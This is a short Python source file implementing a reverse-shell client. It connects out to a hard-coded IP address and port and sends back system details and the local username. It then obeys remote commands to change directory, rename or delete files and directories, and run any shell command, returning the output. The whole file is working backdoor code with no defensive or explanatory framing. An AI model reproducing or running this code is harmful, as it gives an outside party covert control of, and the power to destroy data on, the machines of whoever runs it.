import os
import socket
import sys
import shutil
import subprocess

data = [sys.platform, os.getcwd(), os.environ['USERNAME']]
s = socket.socket()

while True:
    try:
        s.connect(('192.168.43.188', 9898))
        while True:
            msge = str(s.recv(1024), 'utf-8').strip()
            if msge == 'check4live':
                print('You are connected to the server...')
                s.send(str.encode(str(data)[1:-1]))
            elif msge == 'quit':
                print('Connection is closed now from server!!!')
                s.close()
                sys.exit()
            elif len(msge) > 2 and msge[:2] == 'cd':
                try:
                    msge = msge.split()[1]
                    os.chdir(msge)
                    s.send(str.encode('Current Directory =>' + str(os.getcwd())))
                except IndexError:
                    s.send(str.encode('Not valid directory!!!'))
                except os.error as e:
                    s.send(str.encode('Error => ' + str(e)))
            elif len(msge) > 5 and msge[:5] == 'rname':
                src, dst = msge.split()[1:]
                try:
                    os.rename(src, dst)
                    s.send(str.encode('Renamed Successfully!!!'))
                except os.error as e:
                    s.send(str.encode('Error => ' + str(e)))
            elif len(msge) > 4 and msge[:4] == 'rmve':
                msge = msge.split()[1]
                try:
                    os.remove(msge)
                    s.send(str.encode('File Deleted Successfully!!!'))
                except os.error as e:
                    if os.path.exists(msge):
                        try:
                            shutil.rmtree(msge)
                            s.send(str.encode('Directory Deleted Successfully!!!'))
                        except NotADirectoryError as mm:
                            s.send(str.encode('Error => 1) ' + str(mm) + ' OR, \n2) ' + str(e)))
                        except PermissionError as mm:
                            s.send(str.encode('Error => 1) ' + str(mm) + ' OR, \n2) ' + str(e)))
                        except shutil.Error as mm:
                            s.send(str.encode('Error => 1) ' + str(mm) + ' OR, \n2) ' + str(e)))
                    else:
                        s.send(str.encode('Error => No Such Directory!!!'))
            elif len(msge) != 0:
                p1 = subprocess.run(msge, shell=True, capture_output=True, text=True)
                if p1.returncode == 0:
                    s.send(str.encode(p1.stdout))
                else:
                    s.send(str.encode('Error => ' + p1.stderr))
    except socket.error as e:
        print(e)
        print('Connection is closed...')
        s.close()
        sys.exit()
    except KeyboardInterrupt:
        print('Connection is closed...')
        s.close()
        sys.exit()
